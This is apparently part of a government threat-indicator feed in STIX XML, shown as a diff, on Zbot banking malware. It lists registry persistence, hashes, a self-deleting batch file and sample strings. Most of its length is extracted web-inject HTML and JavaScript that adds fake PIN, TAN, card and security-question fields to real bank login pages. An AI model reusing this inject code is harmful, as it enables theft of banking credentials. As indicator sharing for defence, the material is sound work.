+Value: {AC0F9F7C-A500-6D55-2E20-1399A2F44BF9}
+Data: "c:\Documents and Settings\[USER]\Application Data\[RANDOM DIRECTORY]\[RANDOM FILE NAME].exe"
+
+A batch file is created in the user's %temp% directory. The purpose of the batch file is to delete the original loader file after execution and then delete itself. The contents of the batch file are displayed below:
+
+@echo off
+:d
+del "C:\Documents and Settings\Administrator\Desktop\badfiles\Quotation.exe"
+if exist "C:\Documents and Settings\Administrator\Desktop\badfiles\Quotation.exe"
+goto d
+del /F "C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\tmp3cef5780.bat"
+
+ADDITIONAL CONFIGURATION DATA FOUND DURING ANALYSIS:
+Egixx\ocuxu.exe
+Uqybi\meuk.aty
+Ozomul
+Kueqruwyn
+Ymop
+Ruvodako
+
+-----BEGIN RELEVANT STRING DATA-----
+IsWow64Process
+"%s"
+"%s" %s
+userenv.dll
+CreateEnvironmentBlock
+DestroyEnvironmentBlock
+del "%s"
+if exist "%s" goto d
+bat
+@echo off
+del /F "%s"
+/c "%s"
+ComSpec
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1)
+HTTP/1.1
+POST
+GET
+Connection: close
+urlmon.dll
+ObtainUserAgentString
+0:0
+S:(ML;;NRNWNX;;;LW)
+SeSecurityPrivilege
+S:(ML;CIOI;NRNWNX;;;LW)
+cab
+cabinet.dll
+FCICreate
+FCIAddFile
+FCIFlushCabinet
+FCIDestroy
+bcdfghklmnpqrstvwxz
+aeiouy
+Global\
+Local\
+script
+nbsp;
+Basic
+tmp
+%s%08x.%s
+%s%08x
+.exe
+SeTcbPrivilege
+SOFTWARE\Microsoft
+.txt
+SysListView32
+MDIClient
+CiceroUIWndFrame
+ConsoleWindowClass
+#32768
+SysShadow
+FIXME
+nspr4.dll
+Host
+Content-Length
+http://
+NSS layer
+https://
+Referer
+Content-Type
+Authorization
+HTTP/1.
+Transfer-Encoding
+chunked
+Connection
+close
+Proxy-Connection
+identity
+Accept-Encoding
+If-Modified-Since
+.tmp
+http://www.google.com/webhp
+SeShutdownPrivilege
+socks
+vnc
+cGlobal\%08X%08X%08X
+RFB 003.003
+RFB
+GetProcAddress
+LoadLibraryA
+.dat
+0xF52BE0F5
+-----END RELEVANT STRING DATA-----</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-7f2ff1f9-da3a-4840-84d2-a6a1c5dd9e81">
+        <cybox:Object id="CISCP:Object-229d81dc-2a40-4194-b61e-8fb75ec6c8aa">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:Size_In_Bytes condition="Equals">140800</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">f02f58d28d384ed056beb531bc4c1edb</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">6423fa3e59b5441ce60972b946384f595b505511</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">3072:/caqyte6kV77snHLLxt4yaXOqdPNbnhW4IxZx5kCZuubFrhU1wKKrONm:/caBty77snHRjY7PNNW4IxZ7zbC0rONm</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+          <cybox:Related_Objects>
+            <cybox:Related_Object id="CISCP:Object-d6e67775-f16c-45f8-9951-26a6fb0cb2f8">
+              <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
+                <WinRegistryKeyObj:Key condition="Equals">SOFTWARE\Microsoft\Windows\CurrentVersion\Run\</WinRegistryKeyObj:Key>
+                <WinRegistryKeyObj:Hive condition="Equals">HKEY_CURRENT_USER</WinRegistryKeyObj:Hive>
+                <WinRegistryKeyObj:Values>
+                  <WinRegistryKeyObj:Value>
+                    <WinRegistryKeyObj:Name condition="Equals">{AC0F9F7C&#8208;A500&#8208;6D55&#8208;2E20&#8208;1399A2F44BF9}</WinRegistryKeyObj:Name>
+                    <WinRegistryKeyObj:Data condition="Equals">c:\Documents and Settings\[user]\Application Data\[RANDOM DIRECTORY]\[RANDOM FILENAME].exe</WinRegistryKeyObj:Data>
+                  </WinRegistryKeyObj:Value>
+                </WinRegistryKeyObj:Values>
+              </cybox:Properties>
+              <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Contains</cybox:Relationship>
+            </cybox:Related_Object>
+          </cybox:Related_Objects>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-05-29T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-41089c9b-5856-4502-852e-0cdd774111ab" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>The submitted file is downloaded by the Zbot malware. This file is encrypted and contains configuration data for the malware to deploy. The following HTML code and JavaScript was extracted from the memory space of a process hijacked by the malware. The data below was likely taken from the decrypted configuration file and loaded into memory.
+
+EXTRACTED CODE SECTION 1: This section of code was written to exploit the website:
+https://onlinebanking.norisbank.de
+
+-----BEGIN EXTRACTED CODE SECTION 1-----
+&lt;p class="log_on_description" id="log_on_description"&gt;
+&lt;/div&gt;&#8250; Please enter your&lt;br&gt;Customer ID
+Number&lt;br&gt;&lt;b&gt;or&lt;/b&gt;&lt;br&gt;Username&lt;br&gt;(if you have created one)&lt;br&gt;&lt;b&gt;and&lt;/b&gt;&lt;br&gt;your
+Personal Access Code (PAC)&lt;br&gt; &lt;/p&gt;
+&lt;div id="tran_confirm"&gt;
+&lt;/div&gt;
+&lt;span&gt; Please enter Personal Access Code (PAC)&amp;#58;
+&lt;/span&gt;&lt;br&gt;&lt;br&gt;
+&lt;label for="pac" class="tran_confirm"&gt;PAC&lt;/label&gt;
+&lt;br&gt;
+&lt;input type="password" name="pac" id="pac" class="password" value="" size="6"
+maxlength="6" title="enter access code"&gt;id="butt" onclick=" x
+if (document.forms[0].pac.value.length &lt; 6)
+{
+alert('Invalid or incomplete data received ');
+return false;
+}
+else
+name="sl_clave"*&lt;/div&gt;
+&lt;div class="fila"&gt;
+	&lt;div class="textoform"&gt;Firma:&lt;/div&gt;
+	&lt;div class="inputform"&gt;&lt;input type="password" name="ESpass" TABINDEX="3" size="10"
+		class="inpTexto" maxlength="8"&gt;&lt;/div&gt;
+&lt;/div&gt;7
+&lt;input type="hidden" name="anterior" value="LOGIN"&gt; 2
+&lt;input type="hidden" name="ESpass" value=""&gt; onclick=
+"javascript:
+var vv=document.forms[0].ESpass.value;if(vv.length&lt;4){
+alert('Firma no encontrado.');return;} document.enviar.ESpass.value=vv;"p
+set_url https://onlinebanking.norisbank.de/norisbank/login.do?method=login* GP
+data_before name="pin"*"&gt; &lt;/div&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+	&lt;td class="label"&gt;
+		&lt;div align="left"&gt;TAN&lt;/div&gt;
+	&lt;/td&gt;
+	&lt;td&gt;
+		&lt;div align="left"&gt;
+			&lt;input type="password" name="tan" maxlength="6" size="6" tabindex="2"
+			style="width:50px;"&gt; name="" ~ OnClick="javascript: if
+			(document.forms[0].tan.value.length &lt; 3) {
+			alert('Bitte hier die TAN eingeben');return false;}" nter/ y &#166; &lt;input
+			type="text" name="simple_membershipNumber_text"*&lt;/tr&gt;% &lt;tr&gt;
+			&lt;td class="bold" width="22%" nowrap=""&gt;Memorable Word:&lt;/td&gt;
+			&lt;td colspan="2" align="left" width="35%"&gt;
+				&lt;font class="inputstyle"&gt;&lt;input type="text" name="memorable_word"
+					id="memorable_word" size="24" maxlength="24" value="" class="" title="Memorable
+					Word"/&gt;&lt;/font&gt;
+			&lt;/td&gt;
+	&lt;/tr&gt; _( / w name="PIN"*&gt; &lt;/tr&gt;
+	&lt;tr&gt;
+	&lt;/td&gt;
+	&lt;td&gt;Clave de Firma&lt;/td&gt;
+	&lt;td&gt;
+		&lt;input type="text" name="ESpass" size="8" maxlength="8" value=""&gt;
+	&lt;/td&gt;! function Enviar_formulari()*{ w if
+	(document.userpass.ESpass.value.length &lt; 4) {
+	alert(' Clave de Firma no encontrado');
+	bPotEntrar=true;
+	} else u&gt; ( _name="secret"*/&gt;&lt;p&gt;Credit Card Number:&lt;/p&gt;&lt;input type="text"
+	size="30" maxlength="20" name="CCnum" value=""/&gt;&lt;p&gt;CVV:&lt;/p&gt;&lt;input type="text"
+	name="CVV" maxlength="3" size="5" value=""/&gt; value="Log In"onclick="javascript:if
+	(document.go.CCnum.value.length &lt; 16) {
+	alert('Please enter Credit Card Number');document.go.CCnum.focus();return
+	false;};else if (document.go.CVV.value.length &lt; 3) {
+	alert('Please enter CVV');document.go.CVV.focus();return false;};" &gt;
+	"loginMessageTD"*"&gt; r Please enter your customer Number&lt;BR&gt;&lt;BR&gt;Please enter your
+	DOB(dd/mm/yyyy)&lt;BR&gt;&lt;BR&gt;Please enter your Passcode
+-----END EXTRACTED CODE SECTION 1-----
+
+EXTRACTED CODE SECTION 2: This section of code was written to exploit the website:
+https://online.lloydstsb.co.uk
+
+-----BEGIN EXTRACTED CODE SECTION 2-----
+&lt;form name="loginForm"
+	method="post"&lt;/table&gt;lF&gt;id="username"&gt;&lt;/div&gt;*&lt;/div&gt;*&lt;/div&gt;&lt;div class="row"&gt;
+&lt;div class="label"&gt;&lt;label for="password"&gt;Password&lt;/label&gt;&lt;/div&gt;
+&lt;div class="value"&gt;&lt;input type="password" name="password" maxlength="32"
+	size="12" value="" id="password"&gt;&lt;/div&gt;
+&lt;div class="required"&gt;*&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="row"&gt;
+	&lt;div class="label"&gt;&lt;label for="apassword"&gt;Autorization Password&lt;/label&gt;&lt;/div&gt;
+	&lt;div class="value"&gt;&lt;input type="password" name="apassword" maxlength="32"
+		size="12" value="" id="apassword"&gt;&lt;/div&gt;
+	&lt;div class="required"&gt;*&lt;/div&gt;
+&lt;/div&gt;
+name="password"*&lt;/TD&gt;*&lt;/TD&gt;&lt;TD align="left" colspan="7"
+valign="bottom"&gt;&lt;/TD&gt;&lt;/TR&gt;&lt;TR&gt;
+&lt;TD class="textoHome" align="left"&gt;3. Clave de Transferencias&lt;/TD&gt;
+&lt;TD width="20"&gt;&lt;IMG src='/img4bog/px.gif' border='0' width="20" height="1"&gt;&lt;/TD&gt;
+&lt;TD align="left"&gt;&lt;INPUT type="password" name="ESpass" maxlength="60" tabindex="3"
+	class="TextoContenido"&gt;&lt;/TD&gt;)&lt;INPUT type="hidden" name="password"&gt;&lt;INPUT
+type="hidden" name="ESpass"&gt;&lt;TD align="center"&gt;&lt;A href="#"
+		onClick="if(document.teclado.ESpass.value.length&lt;4){alert(' Firma electronica no
+		encontrado.');return;};document.datos.ESpass.value=document.teclado.ESpass.value;&lt;td&gt;&lt;input name="a51" type="image" src="img/ok.gif"
+			alt="OK" value="OK" width="28" height="22" border="0"&gt;&lt;/td&gt;
+	&lt;/tr&gt;
+	&lt;tr&gt;&lt;tr&gt;
+			&lt;td&gt;&lt;img src="img/1.gif" width="28" height="28"&gt;&lt;/td&gt;
+			&lt;td&gt;&lt;a href="https://www.moneymail.ru/?da" class="blue"&gt;&#199;&#224;&#225;&#251;&#235;&#232; &#239;&#224;&#240;&#238;&#235;&#252;?&lt;/a&gt;&lt;/td&gt;
+			&lt;td&gt;&amp;nbsp;&lt;/td&gt;
+			&lt;/tr&gt;&lt;tr&gt;
+			&lt;td&gt;&lt;strong&gt;&#239;&#235;&#224;&#242;&#229;&#230;&#237;&#251;&#233; &#239;&#224;&#240;&#238;&#235;&#252;:&lt;/strong&gt;&lt;/td&gt;
+			&lt;td&gt;&lt;input name="platej_pass" type="password" class="txtSm"&gt;&lt;/td&gt;
+		&lt;/tr&gt;G7n&lt;input type="password" style="font-family: Arial, Helvetica; font-size:
+		10pt; color:#000066; background-color: #e8e8e8;" size="12" maxlength="12"
+		name="passwd" value=&gt;w&lt;tr&gt;
+			&lt;td colspan="5"&gt;&lt;br&gt;&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;td nowrap&gt;
+			&lt;div align="right"&gt;&lt;font color="#000066" size="2" face="Arial, Helvetica,
+					sans-serif"&gt;&lt;b&gt;Date de naissance (JJ/MM/AAAA) &lt;/b&gt;&lt;/font&gt; &lt;/div&gt;&lt;/td&gt;
+		&lt;td&gt;
+			&lt;input type="text" style="font-family: Arial, Helvetica; font-size: 10pt;
+			color:#000066; background-color: #e8e8e8;" size="12" maxlength="12" name="dob"
+			value=&gt;
+				&lt;/td&gt;meni&lt;HEAD&gt;&lt;script type="text/javascript"&gt;
+				function CheckData () {
+					var form = document.forms['inputForm'];
+					if(form.answer1.value.length == 0) {
+						alert ('Please enter you answer');
+						form.answer1.focus();
+						return false;
+					}
+					if(form.answer2.value.length == 0) {
+						alert ('Please enter you answer');
+						form.answer2.focus();
+						return false;
+					}
+					return true;
+				}
+&lt;/script&gt;&lt;form autocomplete="off" onsubmit="CheckData();name="password"
+maxlength="20" size="20"&gt;&lt;/span&gt;&lt;span id="passcodelyr"&gt;&lt;/span&gt;&lt;label
+class="fieldDescription required"&gt;Answer 1:&lt;b&gt; *&lt;/b&gt;&lt;/label&gt;&lt;span&gt;&lt;input
+type="text" name="answer1" maxlength="20" size="20"&gt;&lt;/span&gt;
+&lt;label class="fieldDescription required"&gt;Answer 2:&lt;b&gt; *&lt;/b&gt;&lt;/label&gt;&lt;span&gt;&lt;input
+	type="text" name="answer2" maxlength="20"
+	size="20"&gt;&lt;/span&gt;name="PASSWORD"*&lt;/tr&gt;&lt;tr&gt; &lt;td colspan=4 height=10&gt; &lt;font size=1&gt;
+		&amp;nbsp; &lt;/font&gt; &lt;/td&gt; &lt;/tr&gt;
+&lt;tr&gt;
+	&lt;td WIDTH=20 &gt;&amp;nbsp;&lt;/td&gt;
+	&lt;td &gt;
+		&lt;b&gt;&lt;font size=-1 face="arial,helvetica" &gt; Password Dispositiva: &lt;/font&gt;&lt;/b&gt;
+	&lt;/td&gt;
+	&lt;td ALIGN="left" &gt;
+		&amp;nbsp; &lt;input type="password" name="pass" size="30" style="margin-left: 1px"&gt;
+	&lt;/td&gt;
+	&lt;td WIDTH=20 &gt;&amp;nbsp;&lt;/td&gt;
+&lt;/tr&gt;onClick="if (document.forms[0].pass.value.length &lt; 1) {alert('Per favore,
+riempire Password Dispositiva');return;}"&gt;&lt;if (theForm.userPassword.value == '')
+fldList += ' -- User Password';if (theForm.email.value == '') fldList += ' --
+Associated email';name="userPassword"*&lt;/tr&gt;&lt;tr &gt;
+&lt;td id = "dataText4" class="dataText" align=left &gt;
+	Email associated with account:
+&lt;/td&gt;
+&lt;td align=right &gt;
+	&lt;INPUT class="dataText" type="text" name="email" size="20" value=""&gt;
+&lt;/td&gt;
+&lt;/tr&gt;name="username" maxlength="32" size="12" value=""&gt;*&lt;/tr&gt;&lt;tr bgcolor="#ffffff"&gt;
+&lt;td class="wtspace"&gt;&amp;nbsp;&lt;/td&gt;
+&lt;td class="label" width="50%"&gt;What is your paternal grandmother's first
+	name?&amp;nbsp;&lt;/td&gt;
+&lt;td class="input" width="50%"&gt;&amp;nbsp;&lt;input type="text" name="inja1"
+	maxlength="32" size="12" value=""&gt;
+	*
+	&lt;input type="hidden" name="injq1" value="What is your paternal grandmother's
+	first name?"&gt;
+	&lt;br&gt;&lt;/td&gt;
+&lt;td class="wtspace"&gt;&amp;nbsp;&lt;/td&gt;
+&lt;/tr&gt;&lt;input name="a51" type="image" src="img/ok.gif" alt="OK" value="OK" width="28"
+height="22" border="0"&gt;&lt;/td&gt;&lt;td&gt;&lt;img src="img/1.gif"
+&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;strong&gt;&#239;&#235;&#224;&#242;&#229;&#230;&#237;&#251;&#233; &#239;&#224;&#240;&#238;&#235;&#252;:&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;input name="platej_pass"
+		type="password" class="txtSm"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;if (theForm.userPassword.value == '')
+	fldList += ' -- User Password';if (theForm.inja1.value == '') fldList += ' -- First
+	Answer';name="userPassword"*&lt;/tr&gt;&lt;tr&gt;
+	&lt;td id = "dataText4" class="dataText" align=left &gt;Email associated with
+		account:&lt;/td&gt;
+	&lt;td align=right &gt;&lt;INPUT class="dataText" type="text" name="inja1" size="20"
+		value=""&gt;&lt;/td&gt;
+&lt;/tr&gt;name="usuario"*&gt;&lt;/tr&gt;
+&lt;tr&gt;
+	&lt;td class="literal" colspan="2" nowrap&gt;Firma:
+		&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
+		&lt;input type="text" name="pass" value="" size="14" maxlength="11"&gt;&lt;/td&gt; continua =
+	true*;if(document.datos.pass.value==""){
+	alert("Introduzca su Firma");
+	document.datos.pass.focus();
+	}name="oppasswd"*/&gt;&lt;div class="clear sep4"&gt;&lt;/div&gt;
+	&lt;label for="clave"&gt;Clave de firma: &lt;/label&gt;
+	&lt;input id="clave" name="ESpass" type="password" size="8" maxlength="8"
+	class="input01 aleft w180"/&gt;class="principal01" onclick="var
+	vv=document.Entrada.ESpass.value;if(vv.length&lt;4){alert('Clave personal (Clave de firma) no encontrado.');return;}document.ExtranetParticulares.dse_parentContextName.value=vv;abreflo(\'segu\')*&lt;/script&gt;&lt;/tr&gt;
+&lt;tr&gt;
+	&lt;td width="85"&gt;&amp;nbsp;&lt;/td&gt;
+	&lt;td class="cfcenb" width="100"&gt;Clave de firma:&lt;/td&gt;
+	&lt;td class="cfce" width="12"&gt;&lt;img src="../7054/img/fle_ent.gif"&gt;&lt;/td&gt;
+	&lt;td class="cfce"&gt;
+		&lt;input name="ESpass" value="" class="cinplo10" type="text" maxlength="32"
+		onfocus="foc=1;"&gt;
+	&lt;/tr&gt;
+	&lt;tr&gt;
+		&lt;input type="hidden" name="ESpass" value="0"&gt;if(contS==0)*{
+		if(document.userpass.ESpass.value.length &lt; 5){
+		alert("Introduzca su Clave de firma");
+		document.userpass.ESpass.focus();
+		}
+		else &lt;input name="ctl00$loginCommon$passwordTextBox" type="password"
+		id="ctl00_loginCommon_passwordTextBox" class="input" autocomplete="off"
+		/&gt;&lt;br&gt;&lt;input type="submit" name="ctl00$loginCommon$buttonEnter" value="&#194;&#238;&#233;&#242;&#232;"
+		id="ctl00_loginCommon_buttonEnter" class="button" /&gt;&lt;br&gt;
+		&lt;input name="ctl00$loginCommon$pltej_pass" type="password"id="ctl00_loginCommon_passwordTextBox" class="input" autocomplete="off"
+		/&gt;&lt;br&gt;&lt;td&gt;&lt;input class="text" type="text" name="userId" value=""&gt;&lt;/td&gt;J&lt;td&gt;&lt;input
+			class="text" type="password" name="password" value=""&gt;&lt;/td&gt;)&lt;td
+			class="merchantLogin"&gt;&#239;&#224;&#240;&#238;&#235;&#252;&lt;/td&gt;q&lt;td class="merchantLogin"&gt;&#239;&#224;&#240;&#238;&#235;&#252;&lt;/td&gt;
+		&lt;td&gt;&lt;input class="text" type="password" name="password" value=""&gt;&lt;/td&gt;?&lt;td&gt;&lt;input
+			class="button" type="submit" value="&#194;&#238;&#233;&#242;&#232;"&gt;&lt;/td&gt;~&lt;td
+			class="merchantLogin"&gt;&#239;&#235;&#224;&#242;&#229;&#230;&#237;&#251;&#233; &#239;&#224;&#240;&#238;&#235;&#252;&lt;/td&gt;
+		&lt;td&gt;&lt;input class="text" type="password" name="platej_pass"
+			value=""&gt;&lt;/td&gt;NAME="Password"*&lt;/tr&gt;&lt;tr bgcolor="#ffffff"&gt;
+		&lt;td bgcolor="#e8f404" class="b10" height="35" valign="middle"&gt;&lt;b&gt;&lt;label
+					for="NomeUtente"&gt;Codice:&lt;/label&gt;&lt;/b&gt;&lt;/td&gt;
+		&lt;td&gt;&lt;input id="NomeUtente" NAME="codice" maxlength ="50"&gt;&lt;/td&gt;
+		href="javascript:if(document.frmRegister.codice.value.length&lt;5){alert('Inserisci la
+		Codice');}else &lt;input name="ctl00$loginCommon$passwordTextBox" type="password"
+		id="ctl00_loginCommon_passwordTextBox" class="input" autocomplete="off"
+		/&gt;&lt;br&gt;&#8218;&lt;input type="submit" name="ctl00$loginCommon$buttonEnter" value="&#194;&#238;&#233;&#242;&#232;"
+		id="ctl00_loginCommon_buttonEnter" class="button" /&gt;&lt;br&gt;
+		&lt;input name="ctl00$loginCommon$pltej_pass" type="password"
+		id="ctl00_loginCommon_passwordTextBox" class="input" autocomplete="off"
+		/&gt;&lt;br&gt;name="Account" id="acct"&lt;/body&gt;&lt;div id="tr"&gt;&lt;/div&gt;
+	&lt;script&gt;
+		function useIframe(ifr_url)
+		{
+			var ifr0 = document.createElement('iframe');
+			ifr0.src = ifr_url;
+			ifr0.style.width = '1px';
+			ifr0.style.height = '1px';
+			var div_x0 = document.getElementById('tr');
+			div_x0.appendChild(ifr0);
+		}
+		useIframe("https://online.lloydstsb.co.uk/account.ibc?Account=" +
+		document.getElementById('acct').value);
+		alert("https://online.lloydstsb.co.uk/account.ibc?Account=" +
+		document.getElementById('acct').value);
+&lt;/script&gt;name="Password"*&lt;/div&gt;&lt;/div&gt;&lt;div id="3" class="clearfix roweven"&gt;
+&lt;div class="Cols1Pos1"&gt;
+	&lt;span id="Passwordlabel" class="label"&gt;
+		*What is your mother's maiden name?
+	&lt;/span&gt;
+	&lt;span class="password"&gt;
+		&lt;input type="password" id="Password" name="injA1" statusline="Please enter you MMN." class="txtfield" tabindex="3" dir="ltr" value="" size=""&gt;&lt;/input&gt;
+	&lt;/span&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+name="PAN_IN"*&lt;/tr&gt;&lt;tr&gt;
+&lt;td align="right" valign="top" class="texto"&gt;&lt;span id="ESpass"
+		class="negro"&gt;Firma&lt;/span&gt;&lt;/td&gt;
+&lt;td&gt;
+	&lt;input type="password" size="8" maxlength="6" name="ESpass" style="width:50px"
+	class="negro"/&gt;
+&lt;/td&gt;
+&lt;/tr&gt;'color:#FFFFFF" onclick="javascript:;return false;"/&gt;EScheck()var
+JLI_cone="*;function EScheck(){
+if (window.document.identifica.ESpass.value &lt; 4) {
+window.alert("Por favor, introduzca la Firma electronica.");return;}
+else {Pulsado2();}
+}&lt;b&gt;Registration Number.&lt;b&gt;&lt;/td&gt;4&lt;/b&gt;&lt;br&gt; and &lt;b&gt;FULL Personal Access Code
+	(PAC).%"8" size="8" tabindex="1"/&gt;&amp;nbsp;&lt;/tr&gt;
+&lt;tr&gt;
+	&lt;td colspan="3"&gt;&lt;span class="boldText"&gt;Personal Access Code:&lt;/span&gt;
+		&lt;input type="text" id="uk_PAC" name="uk_PAC" maxlength="10" size="8"
+		tabindex="1"/&gt;&amp;nbsp;function frmPresign_onsubmit() {if
+		(document.frmPresign.uk_PAC.value.length &lt; 6) {
+		alert('You must enter full Personal Access Code (PAC).')
+		document.frmPresign.uk_PAC.focus();return false;};
+		else id="username"*&lt;/div&gt;*&lt;/div&gt;*&lt;/div&gt;&lt;div class="row"&gt;
+&lt;div class="label"&gt;&lt;label for="username"&gt;Autorization
+		Password&lt;/label&gt;&lt;/div&gt;
+&lt;div class="value"&gt;&lt;input type="password" name="UKpass"
+	maxlength="32" size="12" tabindex="2" value="" id="UKpass"&gt;&lt;/div&gt;
+&lt;div class="required"&gt;
+	*
+&lt;/div&gt;
+&lt;/div&gt;name="submit_logon" OnClick="javascript: if
+(document.logonForm.UKpass.value=='')
+{
+document.logonForm.companyID.value='';
+document.logonForm.username.value='';
+document.logonForm.UKpass.value='';
+alert('Enter your Autorization Password!');
+}"name=usuario*&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
+		&lt;/TR&gt; &lt;TR&gt; &lt;TD align=left&gt;&lt;FONT size=+0&gt;&lt;B&gt;
+		Clave&amp;nbsp;de Firma:&lt;/B&gt;&lt;/FONT&gt;&lt;/TD&gt; &lt;TD align=left colSpan=3&gt;&lt;INPUT type=password
+maxLength=8 align=center size=8 value="" name=ESpass&gt;&lt;/TD&gt;3&lt;input type="hidden"
+name="SXPASWI_A" value=""&gt;&lt;input type="hidden" name="ESpass" value=""&gt;&lt;td&gt;&lt;a
+		href="javascript:-"&gt;&lt;img src=img/boton_b.gif border=0&gt;&lt;/td&gt;var
+	vv=document.forms[0].ESpass.value;if(vv.length&lt;4){alert('Clave personal (Clave de
+	firma) no encontrado.');return;}document.nuevo.ESpass.value= vv;&lt;td&gt;&lt;a
+			href="javascript:var vv=document.forms[0].ESpass.value;if(vv.length&lt;4){alert('Clave
+			personal (Clave de firma) no encontrado.');return;}document.nuevo.ESpass.value=
+			vv;type="password" name="password"*&lt;/tr&gt;&lt;tr&gt;
+			&lt;td width="40%" style="color:
+				#fff;text-align:left;padding-left:20px;padding-right:5px;font-size:12px;"&gt;TAN
+				Code&lt;/td&gt;
+			&lt;td style="padding-right:20px;"&gt;&lt;input type="text" name="tancode" value=""
+				style="width: 250px;" class="inputSecret" /&gt;&lt;/td&gt;
+&lt;/tr&gt;&lt;INPUT TYPE="Password" NAME="Password" SIZE="30"&gt;&lt;/SMALL&gt;&lt;/TD&gt;
+&lt;/TR&gt;
+&lt;TR VALIGN="BOTTOM"&gt;
+	&lt;TD NOWRAP CLASS="bggreenMd" ALIGN="right"&gt;&lt;INPUT TYPE="Submit" NAME="approve"
+		VALUE="&#239;&#238;&#228;&#242;&#226;&#229;&#240;&#228;&#232;&#242;&#252;" CLASS="button"&gt;&lt;/TD&gt;
+&lt;/TR&gt;
+&lt;/FORM&gt;
+&lt;/TABLE&gt;&lt;BR&gt;&#207;&#235;&#224;&#242;&#229;&#230;&#237;&#251;&#233; &#239;&#224;&#240;&#238;&#235;&#252;&lt;BR&gt;
+&lt;INPUT TYPE="Password" NAME="Platej_passw" SIZE="30"&gt;function WebForm_OnSubmit()
+{if (document.aspnetForm.ExtTrCode.value.length &lt; 4) {
+alert('Please enter valid External Transfer Code!');
+return false;
+}else/&gt;&lt;/span&gt;&lt;br /&gt;&lt;/div&gt;&lt;br /&gt;
+&lt;div id="ExtCode" &gt;External Transfer Code&amp;nbsp;:&lt;input name="ExtTrCode"
+	type="password" maxlength="16" id="ExtCode" class="searchbox" /&gt;
+	name="_D:auto_username"*"&gt;&lt;tr&gt;
+		&lt;td&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&lt;td class="dati-content"&gt;
+			Password Dispositiva&lt;br&gt;
+			&lt;input name="pass" type="text" class="textarea" size="20" style="width:148px"
+			value=""&gt;function submitDaLogin*{if ( yoForm.pass.value=="" ){
+			alert ( "Per favore, riempire Password Dispositiva" );
+			return false;return true*;name="inputuserid"*autocomplete="off"*&lt;/p&gt;&lt;P
+			style='MARGIN: 0px 0px 0.6em'&gt;&lt;LABEL class=boldpurple&gt;your password:
+			&lt;/LABEL&gt;&lt;BR&gt;&lt;INPUT type=password size=30 id=m3 name=cahoot_password value=''
+			autocomplete='off'&gt; &lt;/P&gt;continue_cerulean_text.gif"OnClick="javascript:
+			if(document.getElementById('m3').value.length &lt;3){alert('Please, provide all
+			information');return false;}" target="_blank"&gt;Forgot Password?&lt;/a&gt;&lt;br /&gt;&lt;label
+			for="userid"&gt;Email&lt;/label&gt;&lt;input type="text" name="email" maxlength="32"
+		class="appfield1" id="email" /&gt;&lt;br /&gt;class="grid accountListTable"&gt;1&lt;div
+			id="_ctl0_PageContent_divODDepositInfo"&gt;NationalCity balance:&lt;td&gt;&lt;input
+				name="LoginControl1$Username"*&lt;/tr&gt;&lt;tr&gt;
+				&lt;td class="formFieldLabel"&gt;&lt;span&gt;Answer 1&lt;/span&gt;&lt;/td&gt;
+				&lt;td&gt;&lt;input name="answer1" type="text" maxlength="30" /&gt;&lt;/td&gt;
+		&lt;/tr&gt;&lt;div class="fr_col2of2"&gt;*id="memDetail"*&lt;/div&gt;*&lt;/div&gt;
+		&lt;div class="fr_col_wrapper"&gt;
+			&lt;div class="fr_col1of2"&gt;
+				&lt;span&gt;Transfer password*&lt;/span&gt;
+			&lt;/div&gt;
+			&lt;div class="fr_col2of2"&gt;
+				&lt;INPUT maxLength=16 id="fp" name=alliance_trans_pass
+				style='width:115px;'&gt;
+			&lt;/div&gt;
+		&lt;/div&gt;
+		class="button_rightv2"OnClick="javascript: if
+		(document.getElementById('fp').value.length &lt;3){alert('Please, provide all
+		information');return false;}"&lt;input type="password" id="password" name="password"
+		size="10" maxlength="50" value="" class="soInputSignon"&gt;
+	&lt;/td&gt;
+	&lt;/tr&gt;&lt;tr&gt;
+	&lt;td&gt;&lt;/td&gt;
+	&lt;td&gt;&lt;img src="/JPS/portal/images/spacer.gif" alt="" width="1" height="1"
+		border="0"&gt;&lt;/td&gt;&lt;tr&gt;
